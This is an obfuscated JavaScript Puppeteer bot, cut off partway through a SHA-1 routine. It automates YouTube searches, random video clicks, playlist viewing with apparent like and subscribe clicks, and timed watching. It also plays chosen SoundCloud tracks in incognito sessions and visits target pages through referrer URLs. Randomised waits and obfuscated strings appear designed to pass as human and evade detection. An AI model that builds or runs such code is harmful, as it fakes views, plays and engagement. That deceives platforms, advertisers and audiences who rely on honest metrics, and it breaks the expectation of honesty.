const X = d,
  W = c,
  V = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x12 * -0x3c + -0x80d + 0x3d6))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xb * -0x2ef + 0x18b * -0x5 + 0x2 * 0x13fe), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x9556 + -0xa3c9 + 0x83a3 + (-0x7183 + 0x167c + 0x959f) * random()) : await standardWaitForNetIdle(f), await wait(-0x47e * -0x2 + 0xff3 + -0x1 * 0x567 + (0x19f3 + -0x2989 + 0x1b53 * 0x2) * random()), -0x5 * 0x3ca + 0x1 * 0xb2 + 0x1241;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x6 * 0x2bb + 0x2b1 + 0xb13 * 0x3), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1f28 + -0x2 * -0x95a + 0xc75;
}
async function randomWait() {
  return await wait(0x1 * 0x426 + 0x1a27 + -0xac5 + (-0x33a + -0x1f99 * -0x1 + -0x49 * 0x1f) * random()), -0x16b2 + 0x45b * -0x2 + 0x1f69;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1912 * -0x1 + -0x3af * -0x2 + -0x2070, -0x1 * 0x17c7 + -0x1a26 * -0x1 + -0x258), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x33e5 + 0xb41a + 0x6a2b) * getRandomInt(0x25a8 + -0x453 + 0x13 * -0x1c1, -0x48d * 0x2 + 0x1f69 + -0x164a), h)), -0x524 + 0x118 + 0x40d;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x11 * 0x96 + -0xb1f * -0x1 + -0x1515 * 0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x2ab * -0x6 + -0x1a23 + 0x2a25 * 0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x8fa * -0x1 + -0x1 * -0x18a7 + -0x21a0]['split']('\x20');
    for (let k = -0x207b + 0x87d + 0x53 * 0x4a; k < i['length']; k += 0x9ea + -0x2f4 + 0x5 * -0x164)
      j += i[k] * h[i[k + (0x11bb + -0x479 + -0x75 * 0x1d)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = d;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2485 + 0x1c2f + -0xa * -0xd6)['map'](l => Array['from'](l['children']))['flat'](-0x15d3 * 0x1 + 0x15db + 0x7 * -0x1)['map'](l => l['childNodes'][0x1bd * -0x4 + -0x54 * -0x1d + -0x28f]['childNodes'][-0x1de0 * 0x1 + 0x1806 + 0x5da]['childNodes'][-0xacb + 0x1da5 * 0x1 + -0x12d9]['childNodes'][0x1952 + -0x54 * -0x4f + -0x333e]['childNodes'][0x2b * -0x17 + 0x1 * 0x13d5 + -0xff7]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x10e2 + -0x1f5 * -0x5 + 0xb01, -0x404 * 0x9 + -0x149 * -0xc + 0x70 * 0x5c)), await f[R(0x10)]('#__hookedV' + 'idToWatch'), await wait(-0x2d13 + -0x11fa + 0x95 * 0xd1);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1a888 + -0xf5f3 * 0x1 + 0x388db * 0x1) * getRandomInt(-0x1da5 + 0x30f + 0x1a98, -0x278 * 0x6 + 0x20f + 0xcc6), h);
  return await wait(i), -0x26 * -0x29 + 0x1803 * -0x1 + -0x5 * -0x396;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1b1 * -0x13 + -0x1 * 0x1a0b + -0x618]['children'][0xe21 + 0x1 * 0x1639 + -0x245a]['children'][-0x88c * -0x2 + 0x1062 + -0x359 * 0xa]['children'][-0x1280 * 0x1 + 0x2182 + 0x11 * -0xe2]['children'][-0x1 * 0x2081 + -0x1de0 + 0x3 * 0x14cb]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x7 * -0x190 + -0x12e6 + 0x1dd7;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xc6 * 0x7 + -0xa * -0x1e1 + 0x67e * -0x2 + (0x2447 + -0x23da + -0x3b) * random()
  }), await wait(0x11db * -0x1 + 0x8db * -0x1 + 0x1caa + (-0xaa2 + 0x6 * 0x2ca + -0x4ee) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xac2 + -0x66b + -0x455]['childNodes'][-0x98 * -0x19 + 0x2075 + -0x2f4c]['childNodes'][-0x1e14 + 0x2 * -0x1051 + 0x3eb7]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x2 * -0x55c + -0x7f0 * -0x1 + 0x2cd]['childNodes'][0x1 * 0xa + -0x2288 + 0x227e]['childNodes'][-0x2452 + 0x33 * -0x91 + 0x4137]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xc * 0x183 + -0x1 * -0xd0f + 0x2d6 * -0xb),
          r = -0x59 + -0xcc8 * -0x2 + 0x50b * -0x5;
        for (let u = 0xa1b + -0x1d94 + 0x1379; u < q['length']; u += -0x1ba4 * -0x1 + -0x256a + 0x9c8)
          r += q[u] * k[q[u + (0x24 * -0x1e + 0x7 * 0x1b9 + -0x7d6)]];
        return r;
      }(n);
  });
  await wait((-0x2 * 0x2941 + 0x113 * 0x5d + -0x2933 * -0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1b004 + 0x58f5 * 0x5 + 0xdd9b) * getRandomInt(-0x2b * 0xc5 + 0x5 * 0x2c1 + -0x61 * -0x33, 0xc69 + -0x1f5 * 0xe + 0xf07 * 0x1), h + (-0x1c32 + 0x1 * 0x17ce + -0x5fb * -0x4));
  return await wait(i), 0x5 * 0x31c + 0x1 * -0x6f + -0xf1c;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1e88 + -0x8a1 * 0x1 + 0x7d5 * 0x5), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x13d6 + -0x47 * -0x61 + -0x5 * 0x701 + (-0x1356 + 0x3 * 0x73f + 0x181) * Math['random']());
    });
  }, -0x1305 + -0x1e0b + 0x4c68);
  await wait(0x657fe + -0x1 * 0x8486f + 0x68451);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x1 * -0x1b10f + -0x194 + -0xc51b) * getRandomInt(-0x1a * -0xc8 + 0x2 * 0x89f + -0x3c1 * 0xa, 0x1e4 * -0x5 + -0x184f * 0x1 + 0x21dc * 0x1)), clearInterval(h), 0x15f7 + 0x1 * 0xcc7 + -0x22bd * 0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xfb2 + -0x236f + 0x13bd;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x9 * 0x257 + -0x244e + 0x395e;
    await randomWait();
  }
  return 0x416 * 0x1 + 0x1 * -0x1681 + -0x12 * -0x106;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1 * 0x6b1 + -0x1a54 + 0x1 * 0x13a3 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x2 * 0x701 + -0x54 + 0xe56 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x11 * 0x96 + -0xb1f * -0x1 + -0x1515 * 0x1);
    let h = e[f];
    if (c['jWXyBW'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x57b * 0x1 + -0x5d * 0x5 + -0x3aa, r, s, t = 0x1 * 0xba5 + -0x2263 + -0x29 * -0x8e; s = m['charAt'](t++); ~s && (r = q % (-0x16f3 + -0x570 + 0xb * 0x295) ? r * (0x5 * 0x180 + -0x158 * -0x14 + -0x2220) + s : s, q++ % (-0xd96 + -0x1 * 0x921 + 0x16bb)) ? o += String['fromCharCode'](0x1487 * -0x1 + 0x8fc + 0xc8a & r >> (-(-0x665 * -0x3 + -0x7a6 + -0xb87) * q & 0x925 + 0x1 * 0x210b + -0x2a2a)) : 0x1c33 + 0x944 + 0x45 * -0x8b) {
          s = n['indexOf'](s);
        }
        for (let u = 0xae2 * -0x1 + -0x13d4 + -0x1 * -0x1eb6, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x148a + 0x43 * -0x5 + 0x1 * -0x132b))['slice'](-(-0x2194 + -0x1641 * 0x1 + -0x37d7 * -0x1));
        }
        return decodeURIComponent(p);
      };
      c['zBzhbT'] = i, b = arguments, c['jWXyBW'] = !![];
    }
    const j = e[0x1952 + -0x1868 + -0xea],
      k = f + j,
      l = b[k];
    return !l ? (h = c['zBzhbT'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1212 + 0x2557 + -0x3769 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x14bd * -0x1 + -0x147e + 0x293b;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x5c81 + 0x633 * -0x6 + 0x1317b * 0x1 + getRandomInt(-0x6efb + -0x2c * -0x1c9 + 0xd01 * 0x7, 0x9e71 * -0x1 + -0x55bc + 0x1695d));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1 * -0x1a21 + -0x1ef1 + 0x4d1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1c93 + 0xb7 * 0x1 + 0x1bdc;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x809 + 0x19ad + -0x21b6, -0x23f + 0x1 * -0x1069 + 0x12da)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x991 * -0x4 + -0x41e + -0x1a56 + floor((-0x2a * 0x63 + 0x222f + -0xe09) * random()))), log('p2'), log(await s['evaluate'](() => {
        const T = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x1 * -0xf6bc4788 + -0x31c66 * 0x43a9 + -0x2de014e7 * -0x2),
          0x60c303 + 0x9ec42c + -0x1 * 0x7f872f,
          0x886 * -0x6 + -0x14 * 0x241 + 0xe038,
          -0x2576 + -0x57b * -0x2 + 0x1b00
        ], y = [
          -0x1b88 + 0x2ab + 0x18f5,
          0xfda * -0x2 + -0x14d3 + -0x1 * -0x3497,
          -0x1658 + 0x2 * 0x107b + -0x21e * 0x5,
          -0xdbf + -0x2 * 0x8b + -0xed5 * -0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x2 * 0x8e + 0x1d67 + -0x1e82)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x2411 + -0x2 * 0x10ee + -0x71 * 0x5; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x14a7 + -0x6d3 * 0x1 + -0xdd4) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * -0x1c7c + 0x8a2 + 0x16b * 0xe] = A[-0x28 * -0xda + -0x2 * 0x10af + -0xa2] = A[0xb96 * 0x1 + -0x1734 + 0xb9f] = A[-0xb08 + 0x3f2 + -0x4 * -0x1c6] = A[0xd0 + 0xa1 * -0x29 + 0x1 * 0x18fc] = A[0x411 * 0x5 + 0xef6 + 0x2347 * -0x1] = A[0x95f * 0x4 + -0x1 * -0x60a + -0x2b81] = A[0x4a * 0x4b + 0x223a + -0x37e2] = A[0x1 * -0x1c16 + 0x4d4 + -0x3 * -0x7c3] = A[-0x1264 * 0x1 + 0x139 * -0xd + 0xfb * 0x23] = A[-0x1 * -0x17d7 + 0x4ea * 0x7 + -0x12a * 0x32] = A[0x38b + 0x1 * 0x1a5 + -0x526] = A[-0xe07 + -0xcf0 + 0x1b02] = A[-0x16dc + 0x10b8 + 0x630] = A[-0x35b * -0x6 + 0xf57 + -0x236c] = A[0xa66 + -0x7eb * 0x3 + 0xd69] = A[-0x16ba * -0x1 + 0x8c4 + -0x1f6f] = 0x1a4c + 0x4 * -0x28b + 0x408 * -0x4, this['blocks'] = A) : this['blocks'] = [
                -0x46 * 0x1a + -0x16a3 + 0x1dbf,
                -0x225c + 0x20e9 * -0x1 + -0x3f5 * -0x11,
                0x7f * 0x1a + -0x666 + -0x680,
                0x1f5e + 0x21f * -0x12 + 0x6d0,
                -0x1 * 0x21f5 + -0xcf + 0x22c4,
                -0x45a * -0x3 + 0x101b + -0x1d29 * 0x1,
                -0x138e + 0x2c2 * -0x6 + -0x120d * -0x2,
                -0x1da1 + 0x1544 + 0x85d * 0x1,
                0x18b6 * 0x1 + -0x167 + -0x1cb * 0xd,
                0x1 * -0x203 + -0x2c7 * -0xa + -0x19c3,
                -0x158d + -0x329 * -0x1 + -0x499 * -0x4,
                -0x18ff + -0x4c1 + 0x77 * 0x40,
                0x23e3 * 0x1 + -0xa69 + -0x2 * 0xcbd,
                0x3 * 0x215 + -0x8 * 0x13 + -0x5a7,
                0x24f5 * -0x1 + -0x1 * 0xa3 + 0x2598,
                0x11c7 * 0x1 + -0xcda + -0x4ed,
                -0x17e4 + 0x3 * -0xb37 + -0xd * -0x46d
              ], this['h0'] = 0x55bdf539 * -0x1 + 0x82f9e77b + 0x3a0930bf, this['h1'] = 0x16a5f0f7e * -0x1 + 0x159ca977 + -0x48 * -0x8103922, this['h2'] = 0x120013364 + 0x90abbf58 + 0x1879e32 * -0xb7, this['h3'] = -0x2 * -0x71d2c54 + 0x1f046c9b + 0x223 * -0xd984f, this['h4'] = 0x97bccd27 + -0x9a18780 + 0x35b79c49, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x673 + 0x214b + 0x2 * -0xd6c, this['finalized'] = this['hashed'] = 0x12bc + -0x1efb + -0x5f * -0x21, this['first'] = 0x93b + -0x1 * 0x18d + -0x7ad;
            }
            ['update'](J) {
              const S = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x2039 + -0x3 * -0xa59 + 0x12e * 0x1, O = J['length'] || 0x5 * -0xaf + -0x2186 + 0x24f1 * 0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x466 * 0x3 + 0x16b5 * -0x1 + -0x983 * -0x1, P[0x3b * 0x47 + 0x1 * 0x13b4 + -0x527 * 0x7] = this['block'], P[0x9e * 0x1 + 0x3b9 * 0x1 + -0x3 * 0x16d] = P[0x4f9 * 0x3 + 0x26e3 * 0x1 + 0x1 * -0x35cd] = P[0x10aa + 0x270 + -0x1318] = P[0x1849 * 0x1 + 0x7 * 0x3a1 + -0x31ad] = P[0x34 * -0x5 + -0x533 + -0x1d * -0x37] = P[-0x2198 + -0x198a + 0x3b27] = P[-0x17 * -0xfb + 0x1 * -0x3f5 + -0x1292] = P[0x1331 + 0x2e4 + 0x1 * -0x160e] = P[-0x359 + -0x147e + -0x2a7 * -0x9] = P[-0x3d2 + 0x4 * -0x81b + 0x25 * 0xfb] = P[-0x86 * 0x3b + -0x2415 + 0x4301] = P[0x1185 + -0x1e5f + 0xce5] = P[-0x2a * 0x78 + 0x1 * -0x210d + 0x34c9] = P[-0x1dcd + 0x1453 + 0x987] = P[-0xa1f + -0x2 * -0x1297 + -0x1b01] = P[-0x2022 + 0x140e + 0xc23] = 0x3 * -0xcd9 + -0x2 * -0x1076 + 0x59f), K) {
                    for (N = this['start']; M < O && N < -0x22 * -0x7 + -0x1 * -0x140a + -0x44 * 0x4e; ++M)
                      P[N >> -0x61 * -0x62 + 0x22a4 + -0x47c4] |= J[M] << y[-0x54d * -0x5 + -0xb92 * 0x1 + -0xeec & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1f75 * -0x1 + -0x1 * 0x22ea + 0x3b5; ++M)
                      (L = J['charCodeAt'](M)) < -0x9e6 + 0xdf8 + 0x1c9 * -0x2 ? P[N >> 0x2f * 0x67 + -0x1f6 + -0x10f1] |= L << y[0x59 * -0x4d + 0x1eba + -0xca * 0x5 & N++] : L < 0x19bc + 0x18c3 * 0x1 + -0x2a7f ? (P[N >> -0x8 * 0x3be + 0x149 * 0xb + 0x3 * 0x545] |= (0xa9c + -0xef8 + -0x3 * -0x1b4 | L >> -0x686 + 0xa15 + 0x389 * -0x1) << y[-0x22ab + 0x1e * -0x7d + 0x3154 & N++], P[N >> -0x18ef + 0xa85 * 0x3 + 0xb * -0x9a] |= (0xc6d + 0x8b2 + -0x149f | 0xce * -0x19 + -0x20bf * 0x1 + 0x351c & L) << y[0x1 * 0xd31 + -0x8f8 * -0x4 + 0x5b * -0x8a & N++]) : L < -0x16 * -0x1152 + 0x20f * -0x92 + 0xd8d * 0xa || L >= -0xa086 + 0x2646 * 0xa + 0x2 * 0xe5 ? (P[N >> -0xa9 + 0x2 * -0xa7b + 0x15a1] |= (0x18eb * -0x1 + -0x1b28 + 0x34f3 | L >> -0x41 + -0x8 * -0x186 + -0xbe3 * 0x1) << y[-0x1daf + -0x465 * 0x4 + 0x1 * 0x2f46 & N++], P[N >> 0x119 + -0x19 * -0xe + -0x275] |= (0x1731 + -0x283 * 0xf + 0xefc | L >> -0x7 * 0x4cf + -0x4 * 0x606 + 0x39c7 & 0x18 * 0x124 + 0x35d + -0x1e7e * 0x1) << y[0xbf1 + -0x1083 + 0x495 & N++], P[N >> -0x19f9 * -0x1 + -0xa * 0x2e + -0x182b] |= (0x169a + 0xcc6 + 0x2 * -0x1170 | -0xc6d * -0x1 + -0x669 * -0x3 + -0xb * 0x2db & L) << y[0x10f * -0x11 + 0x26f2 + -0x1 * 0x14f0 & N++]) : (L = -0xbfdf + -0x171d * -0x3 + 0x17a88 + ((-0xd64 + -0x1f9a + -0x30fd * -0x1 & L) << -0x1 * 0x1edc + -0x2 * 0xd3a + 0x395a | 0x2d * -0x5f + 0x50 * 0x5a + -0x76e & J['charCodeAt'](++M)), P[N >> -0x1 * -0x24a3 + -0x18cc + -0xbd5] |= (0x243b + 0x2559 + -0x48a4 | L >> 0x1 * -0x225 + -0x107d + 0x12b4) << y[0x52c * 0x5 + 0x4 * -0x46a + 0x2bb * -0x3 & N++], P[N >> -0x46 * 0x8b + -0x14e * 0x6 + 0x2dd8] |= (-0x2 * 0xabd + 0x794 + 0xe66 | L >> 0x4e9 + 0x347 + -0x824 & 0x182c + -0x2354 + 0xb67) << y[-0x45 * -0x8b + -0x11e3 * -0x1 + 0x1 * -0x3757 & N++], P[N >> -0xf3f * -0x1 + -0x740 + -0x7fd] |= (0xc30 + -0x255d * -0x1 + -0x1 * 0x310d | L >> 0xff8 + -0x11 * 0x203 + 0x1241 & -0x863 * 0x2 + 0x1e1c + -0xd17) << y[-0xb2 + -0x1 * 0xf97 + -0xe * -0x12a & N++], P[N >> 0x265f + 0x240f * 0x1 + -0x4a6c] |= (0x33 * -0x3c + 0x13 * 0x1b2 + 0x119 * -0x12 | 0x1e20 + -0x2b * -0x9 + 0x29 * -0xc4 & L) << y[-0x7 * -0xcb + 0x1274 + 0x4a * -0x53 & N++]);
                  }
                  this[S(0xa) + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x23a1 + 0x1dae + 0x633 ? (this['block'] = P[0xb * 0x30a + -0x1fff * -0x1 + -0x241 * 0x1d], this['start'] = N - (-0xa3 + 0xd52 + 0x425 * -0x3), this['hash'](), this['hashed'] = 0x504 * -0x4 + -0x44 * 0x11 + -0x7 * -0x383) : this['start'] = N;
                }
                return this['bytes'] > -0xda241243 + -0xbaaf3d03 + 0x294d34f45 && (this['hBytes'] += this['bytes'] / (-0x672ac796 * -0x2 + 0x194489ccc * 0x1 + -0x1629e2bf8) << 0x2 * -0x54f + -0x14 * -0xcb + -0x53e, this['bytes'] = this['bytes'] % (0x23763 * -0x2c20 + 0x36abf2d4 + -0x958ffec6 * -0x2)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1d61 * -0x1 + 0xe * -0x113 + 0x2c6c;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x6ce * 0x3 + 0x187 + -0x15e1] = this['block'], J[K >> 0x92f * 0x3 + -0x119f * -0x2 + -0x1 * 0x3ec9] |= x[-0xc42 * 0x3 + -0x1 * -0x11d7 + 0x12f2 & K], this['block'] = J[0x25ca * -0x1 + -0x1690 + 0x3c6a], K >= 0x122 + -0x49e * -0x4 + -0x1362 && (this['hashed'] || this['hash'](), J[-0x2b1 * 0x9 + 0x1c1c + -0x3e3] = this['block'], J[-0xb50 + 0x169 * 0x2 + 0x88e] = J[0x3ed * -0x6 + -0x38 * -0x8a + -0x6a1] = J[0x2696 + 0x2 * 0x12b6 + 0x98 * -0x80] = J[-0x1568 + -0x93 * 0xe + -0x1d75 * -0x1] = J[-0x1b2d * -0x1 + -0x22ee + -0x9 * -0xdd] = J[0x1 * 0x6a1 + 0x127f + 0x1 * -0x191b] = J[0x53 * 0x1 + -0x3a1 * 0x9 + 0x205c] = J[-0x869 * -0x1 + -0x2 * -0x335 + -0xecc] = J[0x25cf + 0x6f2 + -0x2cb9] = J[-0x338 + 0x1100 + -0x3 * 0x495] = J[-0x4a9 * 0x8 + 0x68 * -0x27 + 0x2 * 0x1a95] = J[0xc96 + 0x8 * -0x277 + 0x72d] = J[0x1c77 * -0x1 + 0x6 * -0x625 + 0x4161 * 0x1] = J[0x1c6b + 0xb3e + -0x279c * 0x1] = J[-0x1480 + 0xfe4 + -0x2 * -0x255] = J[0xf6d + 0x22 * -0x122 + 0xb93 * 0x2] = 0x1 * -0xa83 + -0x1b * -0xd5 + -0xbf4), J[-0x53c + 0x202d + -0x1ae3] = this['hBytes'] << 0x269a + -0x1856 * 0x1 + -0xe41 | this['bytes'] >>> -0x5e * 0x2e + -0x1da + 0x12db, J[-0x16ed * 0x1 + -0xef9 * -0x1 + -0x125 * -0x7] = this['bytes'] << 0x359 + 0x32b * -0xb + 0xa81 * 0x3, 